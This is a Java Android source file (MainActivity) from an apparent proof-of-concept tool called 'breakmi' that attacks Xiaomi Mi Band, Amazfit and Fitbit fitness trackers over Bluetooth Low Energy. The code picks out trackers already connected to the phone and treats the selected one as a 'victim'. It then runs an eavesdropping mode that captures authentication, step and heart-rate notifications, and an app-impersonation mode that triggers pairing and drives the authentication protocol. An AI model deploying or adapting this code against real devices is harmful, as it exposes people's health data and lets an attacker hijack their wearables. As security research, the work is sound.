package breakmi;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.content.Context;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;

import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private BluetoothManager bluetoothManager;
    private BluetoothGatt bluetoothGatt;

    private final List<BluetoothDevice> connectedDevices = new ArrayList<BluetoothDevice>();
    private BluetoothDevice victimDevice;
    private int attackType;
    private String victimProtocol = "uninitialized";

    private boolean servicesDiscovered = false;
    private Set<UUID> supportedServices;
    private Map<UUID, BluetoothGattCharacteristic> victimCharacteristics;

    private TextView textConnected;
    private Button buttonChoice;

    private static final List<String> SUPPORTED_MB_P1 = Arrays.asList("MI Band 2", "Mi Band 3", "Amazfit Band 2");
    private static final List<String> SUPPORTED_MB_P2 = Arrays.asList("Mi Smart Band 4", "Mi Smart Band 5", "Mi Smart Band 6");
    private static final List<String> SUPPORTED_FITBIT = Arrays.asList("Charge 2"); // todo Charge 4

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        bluetoothManager = (BluetoothManager) getApplicationContext().getSystemService(Context.BLUETOOTH_SERVICE);

        supportedServices = new HashSet<>(6);

        supportedServices.add(HuamiServices.UUID_SERVICE_HUAMI0);
        supportedServices.add(HuamiServices.UUID_SERVICE_HUAMI1);
        supportedServices.add(HuamiServices.UUID_SERVICE_HEARTRATE);

        supportedServices.add(FitbitServices.UUID_SERVICE_PAIRING);
        supportedServices.add(FitbitServices.UUID_SERVICE_COMMUNICATION);

        Button buttonDetect = (Button) findViewById(R.id.buttonDetect);
        buttonDetect.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                setContentView(R.layout.detected_trackers);
                textConnected = (TextView) findViewById(R.id.textConnected);
                textConnected.setTextColor(Color.RED);
                buttonChoice = (Button) findViewById(R.id.buttonChoice);
                getConnectedTrackers();
                showConnectedTrackers();
            }
        });

    }

    // Abuses Android BLE API to retrieve currently connected BLE devices, filtering by supported trackers
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void getConnectedTrackers() {
        List<BluetoothDevice> cd = bluetoothManager.getConnectedDevices(BluetoothProfile.GATT);
        for (BluetoothDevice device : cd) {
            Log.d(TAG,device.getName());
            matchTracker(device);
        }
    }

    private void matchTracker(BluetoothDevice device) {
        if (findPattern(device, SUPPORTED_MB_P1)) {
            victimProtocol = "mbp1";
        } else if (findPattern(device, SUPPORTED_MB_P2)) {
            victimProtocol = "mbp2";
        } else if (findPattern(device, SUPPORTED_FITBIT)) {
            victimProtocol = "fitbit";
        }

    }

    private boolean findPattern(BluetoothDevice device, List<String> supportedDevicesList) {
        for (String pattern : supportedDevicesList) {
            if (device.getName().contains(pattern)) {
                connectedDevices.add(device);
                return true;
            }
        }
        return false;
    }

    // displays currently connected supported trackers
    private void showConnectedTrackers() {

        final RadioGroup groupRadioTracker = (RadioGroup) findViewById(R.id.groupRadioTracker);
        final RadioGroup groupRadioAttack = (RadioGroup) findViewById(R.id.groupRadioAttack);
        final Button buttonChoice = (Button) findViewById(R.id.buttonChoice);

        for (int i=0; i<connectedDevices.size(); i++) {
            Button rbtn = new RadioButton(this);
            rbtn.setTag(i);
            rbtn.setText(connectedDevices.get(i).getName() + " (" + connectedDevices.get(i).getAddress() + ")");
            rbtn.setGravity(Gravity.CENTER);
            groupRadioTracker.addView(rbtn);

            rbtn.setOnClickListener(new View.OnClickListener() {
                @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
                public void onClick(View view) {
                    int selectedRadioTracker = -1;
                    if (groupRadioTracker.getCheckedRadioButtonId() != -1) {
                        int id = groupRadioTracker.getCheckedRadioButtonId();
                        RadioButton chosenRadio = (RadioButton) groupRadioTracker.findViewById(id);
                        selectedRadioTracker = (int) chosenRadio.getTag();
                    }
                    victimDevice = connectedDevices.get(selectedRadioTracker);
                    bluetoothGatt = victimDevice.connectGatt(getApplicationContext(), false, bluetoothGattCallback);
                }
            });

        }

        final Button rbtEavesdropping = (RadioButton) findViewById(R.id.buttonRadioEavesdropping);
        rbtEavesdropping.setTag(0);
        final Button rbtAppImpersonation = (RadioButton) findViewById(R.id.buttonRadioAppImpersonation);
        rbtAppImpersonation.setTag(1);

        buttonChoice.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
            public void onClick(View view) {
                int selectedRadioAttack = -1;
                if (groupRadioAttack.getCheckedRadioButtonId() != -1) {
                    int id = groupRadioAttack.getCheckedRadioButtonId();
                    RadioButton chosenRadio = (RadioButton) groupRadioAttack.findViewById(id);
                    selectedRadioAttack = (int) chosenRadio.getTag();
                }
                attackType = selectedRadioAttack;
                try {
                    attackStart();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });

    }

    // delay attack start after service discovery is done
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    protected void attackStart() throws InterruptedException {
        if (!servicesDiscovered) {
            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        attackStart();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }, 500);
        }
        else {
            if (attackType == 0) {
                Log.i(TAG, "--EAVESDROPPING--");
                setContentView(R.layout.eavesdropping);
                if (victimProtocol == "fitbit") {
                    enableFitbitCharacteristicNotifications(true);
                    TextView textScrollingEavesdropping = (TextView) findViewById(R.id.textScrollingEavesdropping);
                    textScrollingEavesdropping.setMovementMethod(new ScrollingMovementMethod());
                } else {
                    enableAuthNotifications(true, false);
                    enableXiaomiCharacteristicNotifications(true);
                    TextView textScrollingEavesdropping = (TextView) findViewById(R.id.textScrollingEavesdropping);
                    textScrollingEavesdropping.setMovementMethod(new ScrollingMovementMethod());
                }
            }
            else if (attackType == 1) {
                Log.i(TAG, "--APP IMPERSONATION--");
                if (victimProtocol == "fitbit") {
                    Log.i(TAG, "App Impersonation is not supported on Fitbit Charge 2 yet");
                    UIRenderer.renderAppImpersonation("App Impersonation is not supported on Fitbit Charge 2 yet", MainActivity.this);
                } else {
                    setContentView(R.layout.appimpersonation);
                    enableAuthNotifications(true, true);
                    enableXiaomiCharacteristicNotifications(true);
                    TextView textScrollingAppimp = (TextView) findViewById(R.id.textScrollingAppimp);
                    textScrollingAppimp.setMovementMethod(new ScrollingMovementMethod());
                }
            }
        }
    }

    // manage behaviour when BluetoothGatt events happens (e.g., read, write, notify)
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private final BluetoothGattCallback bluetoothGattCallback = new BluetoothGattCallback() {

        @Override
        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {
            if (newState == BluetoothProfile.STATE_CONNECTED) {
                Log.i(TAG, "Connected to GATT server.");
                Log.i(TAG, "Attempting to start service discovery: " + bluetoothGatt.discoverServices());
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                Log.i(TAG, "Disconnected from GATT server.");
            }
        }

        // perform service discovery
        @Override
        public void onServicesDiscovered(BluetoothGatt gatt, int status) {
            Log.i(TAG, "onServicesDiscovered");
            if (status == BluetoothGatt.GATT_SUCCESS) {
                Set<UUID> supportedServices = getSupportedServices();
                List<BluetoothGattService> gattServices = getSupportedGattServices();
                Map<UUID, BluetoothGattCharacteristic> newCharacteristics = new HashMap<>();
                if (gattServices != null) {
                    for (BluetoothGattService gattService : gattServices) {
                        if (supportedServices.contains(gattService.getUuid())) {
                            List<BluetoothGattCharacteristic> characteristics = gattService.getCharacteristics();
                            for (BluetoothGattCharacteristic gattCharacteristic : characteristics) {
                                newCharacteristics.put(gattCharacteristic.getUuid(), gattCharacteristic);
                            }
                        }
                    }
                    victimCharacteristics = newCharacteristics;
                }
                Log.i(TAG,"servicesDiscovered");
                servicesDiscovered = true;
                activateChoiceAfterConnection();
            } else {
                Log.i(TAG,"onServicesDiscovered received: " + status);
            }
        }

        @Override
        public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) {
            super.onCharacteristicRead(gatt, characteristic, status);
            byte[] value = characteristic.getValue();
            StringBuilder val = new StringBuilder("");
            if (value != null) {
                for (Byte b : value) {
                    val.append(b.toString());
                }
                Log.d(TAG, "Read on " + characteristic.getUuid().toString() + ". Value : " + val.toString());
                if (HuamiServices.UUID_CHARACTERISTIC_AUTH.equals(characteristic.getUuid())) {
                    PrintCharacteristic.printAuth(characteristic.getValue());
                } else if (HuamiServices.UUID_CHARACTERISTIC_STEPS.equals(characteristic.getUuid())) {
                    PrintCharacteristic.printSteps(characteristic.getValue());
                } else if (HuamiServices.UUID_CHARACTERISTIC_HR_MEASUREMENT.equals(characteristic.getUuid())) {
                    PrintCharacteristic.printHeartRate(characteristic.getValue());
                }
            }
        }

        @Override
        public void onCharacteristicWrite(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) {
            super.onCharacteristicWrite(gatt, characteristic, status);
            Log.d(TAG, "Write on " + characteristic.getUuid().toString() + ". Status : " + status);
        }

        @Override
        public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic) {
            Log.d(TAG, "onCharacteristicChanged");
            UUID characteristicUUID = characteristic.getUuid();
            if (HuamiServices.UUID_CHARACTERISTIC_AUTH.equals(characteristicUUID)) {
                Log.i(TAG, "Auth Characteristic Notification");
                try {
                    byte[] value = characteristic.getValue();
                    String sValue = PrintCharacteristic.printAuth(characteristic.getValue());
                    if (attackType == 0) {
                        UIRenderer.renderEavesdropping(characteristicUUID, "Auth: ", sValue, MainActivity.this);
                    }
                    else if (attackType == 1) {
                        authProtocolSelector(characteristic, value);
                    }
                } catch (Exception e) {}
            } else if (HuamiServices.UUID_CHARACTERISTIC_STEPS.equals(characteristicUUID)) {
                Log.i(TAG, "Steps Characteristic Notification");
                String sValue = PrintCharacteristic.printSteps(characteristic.getValue());
                if (attackType == 0) {
                    UIRenderer.renderEavesdropping(characteristicUUID, "Steps: ", sValue, MainActivity.this);
                }
            } else if (HuamiServices.UUID_CHARACTERISTIC_HR_MEASUREMENT.equals(characteristicUUID)) {
                Log.i(TAG, "Heart Rate Measurement Characteristic Notification");
                String sValue = PrintCharacteristic.printHeartRate(characteristic.getValue());
                if (attackType == 0) {
                    UIRenderer.renderEavesdropping(characteristicUUID, "Heart Rate: ", sValue, MainActivity.this);
                }
            } else if (FitbitServices.UUID_CHARACTERISTIC_PAIRING.equals(characteristicUUID)) {
                Log.i(TAG, "Fitbit Pairing Characteristic Notification");
                String sValue = PrintCharacteristic.printRaw(characteristic.getValue());
                if (attackType == 0) {
                    UIRenderer.renderEavesdropping(characteristicUUID, "Fitbit Pairing: ", sValue, MainActivity.this);
                }
            } else if (FitbitServices.UUID_CHARACTERISTIC_COMMUNICATION.equals(characteristicUUID)) {
                Log.i(TAG, "Fitbit Communication Characteristic Notification");
                String sValue = PrintCharacteristic.printRaw(characteristic.getValue());
                if (attackType == 0) {
                    UIRenderer.renderEavesdropping(characteristicUUID, "Fitbit Communication: ", sValue, MainActivity.this);
                }
            } else {
                Log.i(TAG, "Unhandled characteristic changed: " + characteristicUUID);
            }
        }

    };

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void authProtocolSelector(BluetoothGattCharacteristic characteristic, byte[] value) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, InterruptedException {
        if (victimProtocol == "mbp1") {
            ProtocolManager.mbp1Manager(characteristic, value, bluetoothGatt, MainActivity.this);
        } else if (victimProtocol == "mbp2") {
            final BluetoothGattCharacteristic characteristiChunkedTransfer = getCharacteristic(HuamiServices.UUID_CHARACTERISTIC_CHUNKED_TRANSFER);
            ProtocolManager.mbp2Manager(characteristic, characteristiChunkedTransfer, value, bluetoothGatt, MainActivity.this);
        } else if (victimProtocol == "fitbit") {
           // Pairing.fitbitManager(characteristic, value, bluetoothGatt, MainActivity.this);
        }
    }

    public void activateChoiceAfterConnection() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                textConnected.setText(R.string.text_connected);
                textConnected.setTextColor(Color.BLUE);
                buttonChoice.setVisibility(View.VISIBLE);
            }
        });
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void enableAuthNotifications(boolean enable, boolean startPairing) {
        final BluetoothGattCharacteristic characteristicAuth = getCharacteristic(HuamiServices.UUID_CHARACTERISTIC_AUTH);
        setCustomCharacteristicNotification(characteristicAuth,enable);
        if (startPairing) {
            triggerPairing(characteristicAuth);
        }
    }

    private void triggerPairing(final BluetoothGattCharacteristic characteristicAuth) {
        Log.i(TAG,"triggerPairing");
        if (attackType == 1) {
            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
                @Override
                public void run() {
                    if (victimProtocol == "mbp1") {
                        characteristicAuth.setValue(HuamiServices.MB_PAIR_INIT);
                    } else if (victimProtocol == "mbp2") {
                        characteristicAuth.setValue(HuamiServices.MB_PAIR_INIT);
                    } else if (victimProtocol == "fitbit") {
                        characteristicAuth.setValue(HuamiServices.MB_PAIR_INIT);
                        //todo
                    }
                    bluetoothGatt.writeCharacteristic(characteristicAuth);
                }
            }, 8000);
        }
    }

    // activates notification for selected Xiaomi characteristics, need delay to wait for authentication to end
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void enableXiaomiCharacteristicNotifications(boolean enable) {
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                setCustomCharacteristicNotification(getCharacteristic(HuamiServices.UUID_CHARACTERISTIC_STEPS),true);
                setCustomCharacteristicNotification(getCharacteristic(HuamiServices.UUID_CHARACTERISTIC_HR_MEASUREMENT),true);
            }
        }, 5000);
    }

    // activates notification for selected Fitbit characteristics, need delay to wait for authentication to end
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void enableFitbitCharacteristicNotifications(boolean enable) {
        setCustomCharacteristicNotification(getCharacteristic(FitbitServices.UUID_CHARACTERISTIC_PAIRING),true);
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                setCustomCharacteristicNotification(getCharacteristic(FitbitServices.UUID_CHARACTERISTIC_COMMUNICATION),true);
            }
        }, 5000);
    }

    private Set<UUID> getSupportedServices() {
        return supportedServices;
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private List<BluetoothGattService> getSupportedGattServices() {
        if (bluetoothGatt == null) { return null; }
        return bluetoothGatt.getServices();
    }

    private BluetoothGattCharacteristic getCharacteristic(UUID uuid) {
        if (victimCharacteristics == null) { return null; }
        return victimCharacteristics.get(uuid);
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    public void setCustomCharacteristicNotification(BluetoothGattCharacteristic characteristic, boolean enabled) {
        boolean result = bluetoothGatt.setCharacteristicNotification(characteristic, enabled);
        if (result) {
            BluetoothGattDescriptor descriptor = characteristic.getDescriptor(HuamiServices.UUID_CHARACTERISTIC_CLIENT_CONFIG);
            if (descriptor != null) {
                int properties = characteristic.getProperties();
                if ((properties & BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {
                    Log.d(TAG, "NOTIFICATION enabled on characteristic " + characteristic.getUuid().toString());
                    descriptor.setValue(enabled ? BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE : BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);
                    bluetoothGatt.writeDescriptor(descriptor);
                } else if ((properties & BluetoothGattCharacteristic.PROPERTY_INDICATE) > 0) {
                    Log.d(TAG, "INDICATION enabled on characteristic " + characteristic.getUuid().toString());
                    descriptor.setValue(enabled ? BluetoothGattDescriptor.ENABLE_INDICATION_VALUE : BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);
                    bluetoothGatt.writeDescriptor(descriptor);
                }
            }
        }
    }

}